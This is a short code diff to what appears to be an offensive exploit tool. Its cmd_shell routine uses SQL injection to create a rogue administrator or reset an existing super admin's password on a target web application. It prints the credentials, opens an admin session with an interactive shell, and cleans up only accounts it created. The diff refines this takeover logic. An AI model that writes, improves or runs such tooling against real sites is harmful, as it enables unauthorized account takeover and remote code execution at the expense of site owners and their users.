@@ -391,8 +391,12 @@ def cmd_shell(args: argparse.Namespace) -> int:
         info("Creating administrator through the SQLi-to-customizer bridge...")
         generated_admin = creator.create_admin()
         username, password = generated_admin.username, generated_admin.password
-        good(f"Administrator created: {username}")
-        good(f"    email:    {generated_admin.email}")
+        # Distinguish between a newly created admin and an existing super admin whose password was reset.
+        if generated_admin.email:
+            good(f"Administrator created: {username}")
+            good(f"    email:    {generated_admin.email}")
+        else:
+            good(f"Super Admin password reset: {username}")
         good(f"    password: {password}")
 
     session = AdminSession(args.url, timeout=args.timeout, proxy=args.proxy)
@@ -426,7 +430,9 @@ def cmd_shell(args: argparse.Namespace) -> int:
         if args.interactive:
             _repl(session, path)
     finally:
-        if generated_admin:
+        # Only attempt to delete the user if we actually created a new one (email is not empty).
+        # Modifying an existing super admin means we just changed the password; we do not delete the account.
+        if generated_admin and generated_admin.email:
             info("Deleting generated administrator...")
             try:
                 removed_admin = session.delete_user_with_shell(
